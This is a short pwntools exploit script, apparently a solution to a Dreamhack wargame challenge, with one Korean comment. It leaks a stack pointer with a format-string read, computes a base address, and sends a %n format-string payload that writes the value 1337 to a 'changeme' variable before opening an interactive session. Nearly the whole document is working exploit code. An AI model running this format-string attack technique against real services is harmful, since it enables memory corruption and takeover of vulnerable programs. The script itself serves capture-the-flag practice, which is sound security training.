from pwn import *
p = remote("host3.dreamhack.games", 9828)
elf = ELF('./libc.so.6')

p.sendline("%8$p")
leaked=int(p.recvline()[:-1], 16)
code_base=leaked-elf.symbols["__libc_csu_init"]
changeme=code_base+elf.symbols["changeme"]

payload="%1337c"
payload+="%8$n" #8번째 인자 주소에 작성
payload=payload.encode()+p64(changeme)

p.sendline(payload)
p.interactive()
